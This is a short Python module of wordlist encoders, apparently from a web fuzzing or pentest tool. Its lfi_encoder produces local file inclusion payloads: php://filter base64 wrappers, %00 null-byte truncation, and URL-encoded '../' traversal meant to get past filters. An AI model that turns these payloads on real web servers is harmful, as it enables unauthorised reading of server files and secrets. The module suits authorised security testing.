import string

def identity_encoder(w: str):
    yield w

def lfi_encoder(w: str):
    for f in [w, f"php://filter/convert.base64-encode/resource={w}"]:
        yield f
        yield f + "%00"

        if not f:
            return

        encode_dotdot = f.replace("..", "%2e%2e")
        yield encode_dotdot
        yield encode_dotdot + "%00"

        encode_dotdot_and_slashes = encode_dotdot.replace("/", "%2f").replace("\\", "%5c")
        yield encode_dotdot_and_slashes
        yield encode_dotdot_and_slashes + "%00"

def url_encoder_strict(w: str):
    yield "".join("%{0:0>2x}".format(ord(c)) if c not in (string.ascii_uppercase + string.ascii_lowercase + string.digits) else c for c in w)